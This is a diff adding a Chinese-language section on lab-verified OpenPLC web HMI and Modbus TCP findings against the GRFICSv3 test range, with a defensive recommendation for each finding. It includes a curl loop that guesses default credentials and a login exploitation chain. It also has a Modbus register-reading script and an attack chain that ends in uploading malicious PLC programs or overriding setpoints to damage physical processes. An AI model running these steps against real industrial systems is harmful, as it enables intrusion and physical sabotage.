@@ -26,6 +26,7 @@
 18. [Boofuzz Templates](#18-boofuzz)
 19. [Wireshark Display Filters](#19-wireshark)
 20. [Scapy Layer Reference](#20-scapy)
+21. [OpenPLC Web HMI + Modbus TCP 实战发现 (v0.2.5.1)](#21-openplc-实战发现)
 
 ---
 
@@ -2827,6 +2828,124 @@ conpot -f --template iec104_honeypot -l /var/log/conpot.log
 # === Wireshark ===
 tshark -i eth0 -Y "dnp3 || iec60870_104 || iecgoose || iecsv || pn_dcp || ecat || bacnet || modbus"
 ```
+
+---
+
+## 21. OpenPLC Web HMI + Modbus TCP 实战发现
+
+> **来源**：v0.2.5.1 实战验证（2026-08-10）— 针对 GRFICSv3 OpenPLC 容器（真实 OpenPLC v3 + Werkzeug 2.3.7 + Python 3.9.2）
+> **验证指南**：见 `guides/validation-walkthrough-zh.md`
+> **适用场景**：OpenPLC 部署 / 同类 Web HMI + Modbus TCP PLC 架构
+
+### 21.1 OpenPLC Web HMI 默认凭据（F-008 P0）
+
+**实证发现**：OpenPLC Web HMI 默认凭据 `openplc:openplc`，可直接登录 `/dashboard`。
+
+```bash
+# 测试多个常见凭据组合（仅 openplc:openplc 成功）
+for cred in admin:admin admin:openplc openplc:openplc admin:password; do
+  user="${cred%:*}"; pass="${cred#*:}"
+  result=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" \
+    --max-time 3 -X POST http://target:8080/login \
+    -d "username=$user&password=$pass")
+  echo "  $user/$pass: $result"
+done
+# 预期：openplc:openplc → 302 → /dashboard（其余 200 停留在 login）
+```
+
+**完整利用链**（登录后获取 runtime 控制权）：
+```bash
+# 1. 登录获取 cookie
+curl -c cookies.txt -X POST http://target:8080/login \
+  -d "username=openplc&password=openplc"
+
+# 2. 用 cookie 访问 dashboard → 上传/启动 ST 程序 → 完全 PLC 控制
+curl -b cookies.txt http://target:8080/dashboard
+curl -b cookies.txt http://target:8080/modbus  # Modbus 配置页
+```
+
+**防御建议**：安装后立即改默认密码；限制 8080 端口仅工程师站访问；启用反爆破。
+
+### 21.2 nmap modbus-discover 真实行为（F-009 P1）
+
+**SKILL 原文**（line 40 等）暗示 `nmap --script modbus-discover` 返回设备识别信息。
+
+**真实行为**（OpenPLC + 多数现代 PLC）：返回 `ILLEGAL FUNCTION`，因为目标拒绝 FC 0x2B（Read Device Identification）。
+
+```bash
+nmap --script modbus-discover -p 502 target
+# 实际输出：
+# | modbus-discover:
+# |   sid 0x1:
+# |_    error: ILLEGAL FUNCTION
+```
+
+**SKILL 修正指引**：
+- `ILLEGAL FUNCTION` 不算失败 — 反而确认目标是 Modbus 设备但拒绝该 FC
+- 真实生产 PLC 中，施耐德 Modicon M340、ABB AC500、西门子 S7-1500（经 Modbus TCP 网关）多数拒绝 FC 0x2B
+- **可靠替代**：依赖 `nmap -sV` 的服务版本指纹 + Modbus MBAP banner
+
+### 21.3 Modbus HR 0xFFFF 内存泄漏模式（F-010 P2）
+
+**模式**：未初始化的 ST 程序变量在 Modbus HR 中以 0xFFFF（65535）暴露。
+
+```python
+from pyModbusTCP.client import ModbusClient
+c = ModbusClient(host='target', port=502, timeout=5)
+c.open()
+# 读 HR 0-50，找非零且 = 65535 的位置
+hr = c.read_holding_registers(0, 50)
+leak_positions = [(i, v) for i, v in enumerate(hr) if v == 0xFFFF]
+print(f"Memory leak indicators: {leak_positions}")
+# OpenPLC 实证：HR[12] = 65535, HR[13] = 65535
+# 对应 ST 程序变量：purge_manual_sp, product_manual_sp（未初始化的 UINT）
+c.close()
+```
+
+**漏洞机制**：OpenPLC ST runtime 编译时未清零 %QW 映射区，0xFFFF 是 UINT 默认值；远程匿名读取即可洞察内部状态。
+
+**防御建议**：在 ST 程序 VAR_BLOCK 显式初始化所有 UINT 为 0；启用 OpenPLC 的"安全模式"（如有）。
+
+### 21.4 Werkzeug + Python 版本指纹（F-011 P3）
+
+**实证**：nmap -sV 直接披露 OpenPLC Web HMI 的 Werkzeug + Python 版本。
+
+```bash
+nmap -p 8080 -sV target
+# 输出含：8080/tcp open http Werkzeug httpd 2.3.7 (Python 3.9.2)
+```
+
+**利用价值**：
+- Werkzeug 2.3.7 已知 CVE-2023-46136（DoS via multipart）
+- Python 3.9.2 EOL（2025-10），不再接收安全补丁
+- 锁定版本后可针对性查 NVD
+
+**防御建议**：Web HMI 前置反向代理（nginx）隐藏 Server header；定期升级 Werkzeug + Python。
+
+### 21.5 完整攻击链（v0.2.5.1 验证）
+
+针对 OpenPLC 部署的端到端攻击链（CVSS 累积评分 10.0）：
+
+```
+1. nmap 侦察 → 发现 502 (Modbus) + 8080 (Werkzeug) [V7 信息泄漏]
+       ↓
+2. openplc:openplc 登录 Web HMI [V8 默认凭据 CVSS 9.8]
+       ↓
+3. 从 dashboard 上传恶意 ST 程序 [V2 远程代码加载]
+       ↓
+4. 或直接 Modbus 写 HR (setpoint override) [V2 动力学 CVSS 10.0]
+       ↓
+5. tcpdump 被动嗅探长期捕获凭据/数据 [V4 无加密 CVSS 7.5]
+```
+
+**单点最高 CVSS**：10.0（远程匿名设定值修改 → 物理工艺损坏）
+
+### 21.6 验证参考
+
+- **完整验证指南**：`guides/validation-walkthrough-zh.md`（500 行，10 章）
+- **复现步骤**：`evidence/2026-08-10/grficsv3-reproduction-recipe.md`
+- **GRFICSv3 靶场**：https://github.com/Fortiphyd/GRFICSv3
+- **OpenPLC 项目**：https://www.openplcproject.com/
 
 ---
 
